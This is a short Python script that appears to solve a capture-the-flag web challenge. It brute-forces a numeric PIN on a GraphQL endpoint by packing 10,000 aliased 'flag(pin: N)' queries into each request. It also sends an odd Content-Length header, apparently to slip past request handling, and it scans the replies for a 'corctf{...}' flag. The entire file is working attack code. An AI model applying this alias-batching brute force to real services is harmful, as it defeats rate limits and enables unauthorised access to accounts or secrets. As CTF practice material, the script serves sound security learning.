import requests
import re

BASE_URL = "https://web-force-force-39c5d7e77a8178b8.be.ax"


query_template = """
try_{0}: flag(pin: {1})
"""


start = 1000

final_end = 10**5
number_each_iter = 10**4

while start + number_each_iter < 10**5:
    query = ""
    for i in range(start, start + number_each_iter):
        query += query_template.format(i, i)

    query = "{" + query + "}"

    resp = requests.post(
        BASE_URL,
        data=query,
        headers={"Content-Length": "0", "Content-Type": "text/plain"},
    )
    start += number_each_iter
    match = re.search(r"corctf\{.*?\}", resp.text)
    if match:
        print(match.group())
        break
